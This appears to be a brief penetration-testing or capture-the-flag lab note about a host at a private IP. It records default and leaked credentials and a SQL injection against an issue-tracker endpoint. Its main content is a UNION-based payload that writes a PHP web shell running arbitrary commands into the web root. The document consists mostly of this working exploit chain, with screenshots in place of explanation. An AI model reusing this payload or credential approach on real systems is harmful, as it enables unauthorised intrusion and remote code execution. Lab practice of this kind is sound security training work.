_____

> [!info]
IP=192.168.211.147

# 50080

/cloud
- admin:admin

# 17445

issue_user:ManagementInsideOld797


## SQLi

![[Pasted image 20240216090146.png]]

```bash
http://192.168.211.147:17445/issue/checkByPriority?priority=EXPLOIT
```

```sql
' union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/cmd.php' -- -
```

![[Pasted image 20240216091131.png]]


![[Pasted image 20240216091208.png]]





